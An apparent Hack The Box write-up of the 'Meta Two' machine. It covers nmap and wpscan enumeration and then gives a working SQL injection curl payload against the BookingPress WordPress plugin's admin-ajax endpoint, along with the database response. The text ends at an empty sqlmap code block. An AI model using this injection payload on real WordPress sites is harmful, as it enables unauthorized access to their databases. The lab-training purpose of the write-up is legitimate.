---
title: Meta Two
---

Connection and nmap
-------------------

First we connect to the openvpn that HTB provides us and spin the
machine Then we will use nmap, as usual for enumeration:

``` {.shell results="output" wrap=""quote""}
sudo nmap -sC -sV -T4 10.10.11.186
```

The options are following: -sC: to use the default scripts -sV: probes
the open ports for system information -T4: to define the aggressiveness
of the scan

First steps
-----------

We can gather that there are 3 open ports: 21 (ftp), 22 (ssh) and 80
(http).

The version of OpenSSH that is being used does not seem to be vulnerable
but we can try other things such as connecting through ftp:

``` {.shell results="output" wrap=""quote""}
ftp 10.10.11.186
```

and trying to log as anonymous. This does not work.

So we are left with the http service which we know that is nginx/1.18.0
and the hostname is <http://metapress.htb/>.

We then have to go to /etc/hosts and append the ip and hostname using
any text editor. This allows us to open the hostname in the browser
without any problem.

Of course this is true for Linux (which you probably should be using),
in Windows is a little more complicated and I struggled to be able to do
this the first time. I tried to change the host file in System32, then
flush the dns and nothing worked. Finally I simply installed firefox in
WSL2 Kali and I use VcXsrv to view all GUI apps.

One way or another we should be able to browse the page now.

Looking for vulnerabilities
---------------------------

We can look at the source code and it does not seem to be leaking any
credentials but we can see it\'s a Wordpress site. We can play around
with the forms and explore a little. Now we will use wpscan which is a
command line tool for Wordpress security.

``` {.shell}
wpscan --url http://metapress.htb
```

You can look them up in <https://wpscan.com/wordpress/562> and go
through each of them but if we go back to the source code of the events
page we can see that is using a plugin called Bookingpress and filter
our search. In the same page we can see that there is a SQL injection
vulnerability and a proof of concept. In the curl command that is
provided we can see that is taking advantage of Wordpress nonces, which
we can look in the source code such as the one in the generateSpamCatcha
function.

There is a lot of information there but the first thing that catches the
eye is the fact that is telling us that the version of Wordpress (5.6.2)
is identified as insecure. So we will look for the vulnerabilities
associated with this version.

So the command we have to use would look like something like this:

``` {.shell}
curl -i 'http://metapress.htb.com/wp-admin/admin-ajax.php'--data
'action=bookingpress_front_get_category_services&_wpnonce=1b624223cc&category_id=29&total_service=-7507)
UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,-5,-5,-5,-5,-5,-5--
-'
```

You should replace the nonce with the one that you can find in the
source code, and the output will be like this:

> HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 23 Mar 2023 07:08:14
> GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked
> Connection: keep-alive X-Powered-By: PHP/8.0.24 X-Robots-Tag: noindex
> X-Content-Type-Options: nosniff Expires: Wed, 11 Jan 1984 05:00:00 GMT
> Cache-Control: no-cache, must-revalidate, max-age=0 X-Frame-Options:
> SAMEORIGIN Referrer-Policy: strict-origin-when-cross-origin
>
> \[{\"bookingpress~serviceid~\":\"10.5.15-MariaDB-0+deb11u1\",\"bookingpress~categoryid~\":\"Debian
> 11\",\"bookingpress~servicename~\":\"debian-linux-gnu\",\"bookingpress~serviceprice~\":\"\$1.00\",\"bookingpress~servicedurationval~\":\"2\",\"bookingpress~servicedurationunit~\":\"3\",\"bookingpress~servicedescription~\":\"4\",\"bookingpress~serviceposition~\":\"5\",\"bookingpress~servicedatecreated~\":\"6\",\"service~pricewithoutcurrency~\":1,\"img~url~\":\"[http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg](http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg)\"}\]

Now we can use sqlmap, which is a tool for automating the process of
detecting and exploiting SQL injection vulnerabilities. We can use it to
identify the database management system, enumerate databases, tables and
columns, extract the data and even run commands.

``` {.shell results="output" wrap=""quote"" exports="both"}
```
